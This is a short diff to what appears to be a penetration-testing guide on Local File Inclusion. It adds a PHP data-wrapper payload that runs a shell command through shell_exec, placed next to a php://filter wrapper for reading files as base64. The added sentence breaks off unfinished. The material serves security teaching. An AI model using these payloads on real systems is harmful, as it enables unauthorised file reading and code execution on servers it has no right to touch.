@@ -12,6 +12,10 @@ If we want to get a file then it is best to base64 encode it. This will ensure t
 
 `php://filter/convert.base64-encode/resource=[FILE]`
 
+Additionally, the following command demonstrates  how we could execute code if&#x20;
+
+`data:text/plain,<?php echo shell_exec("dir") ?>`
+
 The sections following lists common but interesting files to look at when testing for Local File Inclusion:
 
 ### Linux
